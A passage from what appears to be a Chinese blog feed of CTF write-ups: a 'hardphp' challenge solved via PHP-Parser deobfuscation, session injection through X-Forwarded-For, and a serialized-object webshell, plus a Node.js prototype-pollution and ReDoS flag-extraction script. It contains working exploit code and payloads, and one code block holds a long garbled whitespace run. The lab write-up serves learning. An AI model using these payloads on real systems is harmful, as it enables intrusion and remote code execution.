f64622563417102719d31702419a25ac45566937394df365ad2b1a6068f87035c1672b666a82af46d80648a04cc50f3a7b0b79b85aadef0aaa4ceae9251d518aee35014d0b2dcdefb1b8d6e6ad66ac57e4f4e80a3762d69b97ac30e27ade5043a70cabd47ac85eb89c9cac8135f8b98fb61f0c6215e4b6756e50df83b6a70543e0825a519ce4ebba35bde4978b1e5c65e431380e9b43a50782cc86c43cbbf3fc7ca45396b9c5a323707aa0cb10e181ccc067c67f5ac2432e376a3a0b749312fa8986ef8a0df782cf64158fa7e4317a28135d875ec9d01843978cf218e5bab49b0515587a59593c4ee0c92b28b5f2df87c6a796b6014efa1427329e3b8a8cc0055327610496afe3ef51b5f21d071f98302ee637a7fdfe96094d37841f0032aa3cf76f39569cf7dd7236b03d2348ceb5826da0697f0bd27a04ae0232731958c67b728d8090f4164c49a8bd3e002b28c3ad3912677b0ac5463232680218c63d994a7a1aea3db928c27c5eda961f8cd6a361d7dd73dae01ce7db237e91fad5199b48d3efc2b8a61010c043b7daa31af0d6214b64e78dd1ae52630f1bf06e91107ff04a90ca3c40a0020da73fb650cde279a5c6746aafae23b994ccbc0d46122f6b9b3291e305931454246b9c5b6d98d5b1ce52b15b295f9b2d2738482fc3017843bdc04cec59ff61ca846b1cbdfc9bf44feb067c84d0f8c765f7baa75cce7c6cbd820188f41575f456f4dca225de17118b1080536221c8bffcd5466b661b5ab0f56c07654df11a9d43ebdfa3bd92981841101b1af2c6509a739d5af89feeb28dd416ff9a6c73f7d4d992438e08b2e4c7f17109d10ceab493c6b2e29e4bba89b9049597039f94f89a279bfe7b7a9dfc559446c6fc1eea84993f76388f402fa1b2f8754f48b3c47a74c6ee1dfbb47044830706f79ea7090769b40509a13c245cd25ee0705c5792b902e8a300f62da09a9c634b66e4496cacacc7d8fb43e76a32b7e105db77e799b3c7734cf93847d64739dab84f6c41fcf09f58defc1ae2506db8cf8bc56e3d6bfe6fc21ee4554e77c8599177b455196a445d5fda3c1ca8925f3ec96465512f32334ae22eef18d05e556b19926e2fe32e0c8bc2c2d62209af8a73d66763712f9c85435ea1c98067f41334bcdbf47dcd9abe70de6773631b8507539066c38f886734545d8068e1f8ed7b7b931e3519660cabeb0d64504dc2257db25bec8c0d9c858761229b73a29104bd1453b280c9be4e69efc3ad70373f84e25d0b6103842dbc828b0419b80e0633ee3f37102fc4db8229fd2a80cbe3634672afa06d018bc621c26aa17b2be8d74d60eb692f4f5cbbce24bf730c887572</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>高校战役hardphp复现</title>
    <url>/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>记录hardphp这道题复现过程，学习了Php-Parse进行混淆和解混淆和Session机制的另一种利用方式，如有不足，希望师傅们批评指正。</p>
<a id="more"></a>

<h1 id="0x01-解混淆"><a href="#0x01-解混淆" class="headerlink" title="0x01 解混淆"></a>0x01 解混淆</h1><p>拿到题目源码 ，是下图的格式，需要解混淆。</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329115420004.png" alt="image-20200329115420004"></p>
<p>比赛结束后看了<a href="https://blog.zsxsoft.com/post/42" target="_blank" rel="noopener">zsh</a>师傅发的文章，知道正解是用Php-Parser来解混淆，文章里提出了一种通过Parse来进行代码混淆的方式，Parser是可以用来对php代码进行语法分析的工具，可以将php代码解析成抽象语法树，然后遍历语法树修改树上的节点，最后再将修改后的语法树转换为php代码。这样就可以达到一个混淆代码的作用。遍历抽象语法树需要用到Node visitors ,其相关用法如下图,去这里<a href="https://github.com/nikic/PHP-Parser/blob/master/doc/component/Walking_the_AST.markdown" target="_blank" rel="noopener">Walking the AST</a>详细看下，可能更好理解。</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329133214620.png" alt="image-20200329133214620"></p>
<p>然后看题目中混淆代码的大致规则，可以看到每个php文件前面都是类似这样的结构</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$GLOBALS[<span class="string">'�����'</span>]=unserialize(base64_decode(<span class="string">'xxxxxxxxxxxxxxx'</span>));</span><br><span class="line"></span><br><span class="line">$GLOBALS[$GLOBALS[<span class="string">'�����'</span>][<span class="number">0</span>]]=$GLOBALS[<span class="string">'�����'</span>][<span class="number">3</span>]($GLOBALS[<span class="string">'�����'</span>][<span class="number">2</span>]($GLOBALS[<span class="string">'�����'</span>][<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">$GLOBALS[$GLOBALS[<span class="string">'�����'</span>][<span class="number">0</span>]][$GLOBALS[<span class="string">'�����'</span>][<span class="number">4</span>]+($GLOBALS[<span class="string">'�����'</span>][<span class="number">5</span>]-$GLOBALS[<span class="string">'�����'</span>][<span class="number">6</span>])]</span><br></pre></td></tr></table></figure>

<p>可以知道<code>$GLOBALS[&#39;�����&#39;]</code>为一个数组，首先反向解出<code>$GLOBALS[&#39;�����&#39;]</code>如下图</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329121029339.png" alt="image-20200329121029339"></p>
<p>可以看出<code>$GLOBALS[&#39;�����&#39;][1]</code>仍为一串base64编码的字符串，<code>$GLOBALS[&#39;�����&#39;][2]</code>为<code>base64_docode</code>，<code>$GLOBALS[&#39;�����&#39;][2]</code>为<code>unserialize</code>，<code>$GLOBALS[&#39;�����&#39;][3]</code>之后的值都为int型整数，然后分析上面代码的的第二句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$GLOBALS[$GLOBALS[<span class="string">'�����'</span>][<span class="number">0</span>]]=$GLOBALS[<span class="string">'�����'</span>][<span class="number">3</span>]($GLOBALS[<span class="string">'�����'</span>][<span class="number">2</span>]($GLOBALS[<span class="string">'�����'</span>][<span class="number">1</span>]));</span><br></pre></td></tr></table></figure>

<p>将值代入后可以得出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$GLOBALS[$GLOBALS[<span class="string">'�����'</span>][<span class="number">0</span>]]=unserialize(base64_decode($GLOBALS[<span class="string">'�����'</span>][<span class="number">1</span>]));</span><br></pre></td></tr></table></figure>

<p>我们解出<code>$GLOBALS[$GLOBALS[&#39;�����&#39;][0]]</code>如下图</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329121724099.png" alt="image-20200329121724099"></p>
<p><code>$GLOBALS[$GLOBALS[&#39;�����&#39;][0]]</code>仍然为数组，里面的值有字符串和int值；</p>
<p>然后分析上面代码的第三句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$GLOBALS[$GLOBALS[<span class="string">'�����'</span>][<span class="number">0</span>]][$GLOBALS[<span class="string">'�����'</span>][<span class="number">4</span>]+($GLOBALS[<span class="string">'�����'</span>][<span class="number">5</span>]-$GLOBALS[<span class="string">'�����'</span>][<span class="number">6</span>])]</span><br></pre></td></tr></table></figure>

<p>将其中内容简写后如下图所示：</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329123658889.png" alt="image-20200329123658889"></p>
<p>就是取<code>$GLOBALS[$GLOBALS[&#39;�����&#39;][0]]</code>数组中，对应索引为后面三个值相加减后的结果的值。然后我们开始解混淆，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span> <span class="params">($beforeFilename,$afterFilename)</span></span>&#123;</span><br><span class="line">    <span class="comment">///去掉数组</span></span><br><span class="line">    $parser = (<span class="keyword">new</span> ParserFactory())-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line">    $ast = $parser-&gt;parse(file_get_contents($beforeFilename));</span><br><span class="line">    $traverser = <span class="keyword">new</span> NodeTraverser();</span><br><span class="line">    $traverser-&gt;addVisitor(<span class="keyword">new</span> ArrayToConstant($parser));</span><br><span class="line">    $ast = $traverser-&gt;traverse($ast);</span><br><span class="line">    $prettyPrinter = <span class="keyword">new</span> Standard();</span><br><span class="line">    $ret = $prettyPrinter-&gt;prettyPrint($ast);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      </span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>的图片，在首页可以得到图片在服务器上的文件名，</p>
<p>然后编写exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $err = [];</span><br><span class="line">    <span class="keyword">protected</span> $handle;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($up)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;err = <span class="keyword">array</span>(<span class="string">"/var/www/html/img/upload/air5f878bshuwonslz1lmtce1j9nt8zf.jpg"</span> =&gt; <span class="string">"shell.php"</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $up;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$upload = <span class="keyword">new</span> Upload();</span><br><span class="line">$logger = <span class="keyword">new</span> Logger($upload);</span><br><span class="line">$d = urlencode(serialize($logger));</span><br><span class="line">$e = str_replace(<span class="string">"%00"</span>,<span class="string">"',0x00,'"</span>,$d);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'HTTP_X_FORWARDED_FOR[\',data%3dconcat(\'data|'</span>.$e.<span class="string">'\')%23\']=123'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n\n"</span>;</span><br></pre></td></tr></table></figure>

<p>然后发送两遍，第二遍触发反序列化</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329171758795.png" alt="image-20200329171758795"></p>
<p>然后在/img/upload/文件夹下生成shell.php，然而并不能利用，因为在upload文件夹下有.htaccess文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_flag engine off;</span><br></pre></td></tr></table></figure>

<p>禁止了php文件执行，那么只能寻找include之类的文件包含来利用了，然后发现core.php中有类自动加载器，并且有include文件包含。</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329172720885.png" alt="image-20200329172720885"></p>
<p>然后寻找那里有使用了未定义的类，</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329174200228.png" alt="image-20200329174200228"></p>
<p>每个接口差不多都有一个$v2变量的getTime()静态方法的调用，$v2来源于$_SESSION[‘data’]中数据的反序列化，如果$v2为一个字符串，就可以调用字符串对应的类的静态方法，那么这里如果$v2为一个未定义的类，就会触发前面的类加载器，包含shell。然后伪造session的data。</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329175736213.png" alt="image-20200329175736213"></p>
<p>另外也可以发送</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;aaa&amp;password&#x3D;aaa&amp;HTTP_X_FORWARDED_FOR[&#39;,data%3dconcat(&#39;data|O:5:&quot;shell&quot;:0:&#123;&#125;&#39;)%23&#39;]&#x3D;123</span><br></pre></td></tr></table></figure>

<p>本地测试后，这种方式不是通过$v2调用静态方法触发的，猜测是在unserialize时接收的参数是一个类对象，然后触发的类自动加载器。</p>
<p>之后访问/?s=img/upload就可以得到shell了。</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329180252026.png" alt="image-20200329180252026"></p>
<p>参考链接</p>
<p><a href="https://ganlvtech.github.io/2019/03/01/enphp-decode/" target="_blank" rel="noopener">https://ganlvtech.github.io/2019/03/01/enphp-decode/</a></p>
<p><a href="https://xz.aliyun.com/t/3453" target="_blank" rel="noopener">https://xz.aliyun.com/t/3453</a></p>
<p><a href="https://xz.aliyun.com/t/3428#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3428</a></p>
<p><a href="https://blog.zsxsoft.com/post/42" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/42</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>PHP-Parser混淆</tag>
      </tags>
  </entry>
  <entry>
    <title>高校战“疫”网络安全分享赛部分赛题复现</title>
    <url>/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>GXZY CTF 几道web题目和几道web预期解的复现</p>
<a id="more"></a>

<h1 id="0x01-guess-game-redos解法"><a href="#0x01-guess-game-redos解法" class="headerlink" title="0x01 guess game redos解法"></a>0x01 guess game redos解法</h1><p>复现时题目环境已关，前面反弹shell后拷了题目的源码，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> ejs=<span class="built_in">require</span>(<span class="string">'ejs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(express.json()); <span class="comment">// for parsing application/json</span></span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));<span class="comment">// for parsing application/x-www-form-urlencoded</span></span><br><span class="line">app.use(<span class="string">'/static/'</span>,express.static(<span class="string">"./static/"</span>));</span><br><span class="line">app.engine(<span class="string">'html'</span>,ejs.__express);</span><br><span class="line">app.set(<span class="string">'view engine'</span>,<span class="string">'html'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> config = &#123;</span><br><span class="line">    <span class="string">"forbidAdmin"</span> : <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">//"enableReg" : true</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> loginHistory = [];</span><br><span class="line"><span class="keyword">var</span> adminName = <span class="string">"admin888"</span>;</span><br><span class="line"><span class="keyword">var</span> flag = <span class="string">"g3tFLAaGEAxY"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">            merge(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">userInfo</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> logItem = &#123;<span class="string">"time"</span>:<span class="keyword">new</span> <span class="built_in">Date</span>().toString()&#125;;</span><br><span class="line">    merge(logItem,userInfo);</span><br><span class="line">    loginHistory.push(logItem);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/log'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(loginHistory.length==<span class="number">0</span>)&#123;</span><br><span class="line">        res.end(<span class="string">"no log"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.json(loginHistory);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.end(<span class="string">"ok"</span>);</span><br><span class="line">    <span class="comment">//res.render("index");</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//So terrible code~</span></span><br><span class="line">app.post(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> req.body.user.username != <span class="string">"string"</span>)&#123;</span><br><span class="line">        res.end(<span class="string">"error"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//console.log(req.body.user.username);</span></span><br><span class="line">        <span class="keyword">if</span>(config.forbidAdmin &amp;&amp; req.body.user.username.includes(<span class="string">"admin"</span>))&#123;</span><br><span class="line">            res.end(<span class="string">"any admin user has been baned"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(req.body.user.username.toUpperCase() === adminName.toUpperCase())</span><br><span class="line">                <span class="comment">//only log admin's activity</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"yes"</span>);</span><br><span class="line">                log(req.body.user);</span><br><span class="line">            res.end(<span class="string">"ok"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/verifyFlag'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//res.render("verifyFlag");</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/verifyFlag'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//let result = "Your match flag is here: ";</span></span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">"Emm~ I won't tell you what happened! "</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> req.body.q != <span class="string">"string"</span>)&#123;</span><br><span class="line">        res.end(<span class="string">"please input your guessing flag"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> regExp = req.body.q;</span><br><span class="line">        <span class="keyword">if</span>(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp))&#123;</span><br><span class="line">            <span class="comment">//res.end(flag);</span></span><br><span class="line">            <span class="comment">//Stop your wishful thinking and go away!</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(req.query.q === flag)</span><br><span class="line">            result+=flag;</span><br><span class="line">        res.end(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noDos</span>(<span class="params">regExp</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//match regExp like this will be too hard</span></span><br><span class="line">    <span class="keyword">return</span> !(regExp.length&gt;<span class="number">30</span>||regExp.match(<span class="regexp">/[)]/g</span>).length&gt;<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address;</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>由于没有拷views目录下的文件，这里的render()就注释掉了，install express和ejs后题目既可以运行了，</p>
<p>这里参考了NU1L和<a href="https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/#menu" target="_blank" rel="noopener">de1ta</a>的wp,然后这题有个merge（）函数，</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310210219757.png" alt="image-20200310210219757"></p>
<p>和上回ichunqiu的那道nodejs题merge()函数一样，都可以进行原型链污染，然后我们找那里调用了log函数，</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310210328089.png" alt="image-20200310210328089"></p>
<p>只有在/路由在使用post方法时才会调用log函数，这里传入的是req.body.user，即我们post的data，调用这个函数，需要满足username变大写后与admin888相同，然后找可以进行污染利用的点，</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310210634769.png" alt="image-20200310210634769"> </p>
<p>看到这里/veryfyFlag路由，这里会判断config.enableReg，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> config = &#123;</span><br><span class="line">    <span class="string">"forbidAdmin"</span> : <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">//"enableReg" : true</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>enableReg是未定义的，这里可以通过原型链污染绕过，然后后面把我们输入的q给了regExp,并通过noDos函数限制了我们输入的q。之后用q对flag进行匹配，这里就可以通过，nodejs的redos攻击来盲注出flag。</p>
<blockquote>
<p> <strong><code>match()</code></strong> 方法检索返回一个字符串匹配正则表达式的的结果。</p>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str.match(regexp)</span><br></pre></td></tr></table></figure>

<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul>
<li><p><code>regexp</code></p>
<p>一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp" target="_blank" rel="noopener">正则表达式</a>对象。如果传入一个非正则表达式对象，则会隐式地使用 <code>new RegExp(obj)</code> 将其转换为一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/RegExp" target="_blank" rel="noopener"><code>RegExp</code></a> 。如果你没有给出任何参数并直接使用match() 方法 ，你将会得到一 个包含空字符串的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Array" target="_blank" rel="noopener"><code>Array</code></a> ：[“”] 。</p>
</li>
</ul>
<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><ul>
<li>如果使用g标志，则将返回与完整正则表达式匹配的所有结果，但不会返回捕获组。</li>
<li>如果未使用g标志，则仅返回第一个完整匹配及其相关的捕获组（<code>Array</code>）。 在这种情况下，返回的项目将具有如下所述的其他属性。</li>
</ul>
</blockquote>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/match" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/match</a></p>
<p><a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" target="_blank" rel="noopener">参考</a></p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310212321951.png" alt="image-20200310212321951"></p>
<p>就可以通过这种方式逐位盲注出后面的flag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time,sleep</span><br><span class="line">depth = <span class="number">5</span></span><br><span class="line">pre = <span class="string">'('</span> * depth + <span class="string">'.'</span> + <span class="string">'*)'</span> * depth +<span class="string">'[^'</span></span><br><span class="line">suf = <span class="string">']$'</span></span><br><span class="line">dict = <span class="string">"&#123;&#125;_0123456789abcdefghijklmnopqestuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> </span><br><span class="line">re = [] </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> dict:    </span><br><span class="line">    r=requests.post(<span class="string">'http://127.0.0.1:8081'</span>, json = &#123;<span class="string">"user"</span>: &#123;<span class="string">"username"</span>:<span class="string">"admın888"</span>, <span class="string">"__proto__"</span>: &#123;<span class="string">"enableReg"</span>: <span class="literal">True</span>&#125;&#125;&#125;)    </span><br><span class="line">    begin = time()    </span><br><span class="line">    r=requests.post(<span class="string">'http://127.0.0.1:8081/verifyFlag'</span>, json = &#123;<span 